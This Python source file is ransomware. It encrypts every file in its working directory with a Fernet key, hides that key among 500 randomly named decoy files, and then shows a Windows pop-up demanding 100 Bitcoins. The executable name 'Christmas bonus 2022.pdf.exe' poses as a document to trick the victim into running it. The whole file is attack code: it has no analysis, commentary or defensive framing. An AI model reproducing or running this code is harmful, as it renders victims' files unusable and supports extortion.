import os
from cryptography.fernet import Fernet
import ctypes
import random



files = [] #empty list for all of the found files


for file in os.listdir():
    if file == "Christmas bonus 2022.pdf.exe" or file =="82926249564354929" or file =="decryption.exe":
        continue
    if os.path.isfile(file): #adds all the files found to our list
        files.append(file)


key = Fernet.generate_key()


with open("82926249564354929", "wb") as thekey:
    thekey.write(key)

for i in range(500): #create a lot of files with random numbers to hide where the key would be
    file_name =  str(random.randrange(0, 100000000000000000))
    open(file_name,"x") #x here is purely for creation, if a file with the chosen name already exists it will fail and continue


for file in files:
    with open(file,"rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(contents_encrypted)

ctypes.windll.user32.MessageBoxW(0,"Your files have been encrypted, send 100 Bitcoins to Aabybro", "", 0)


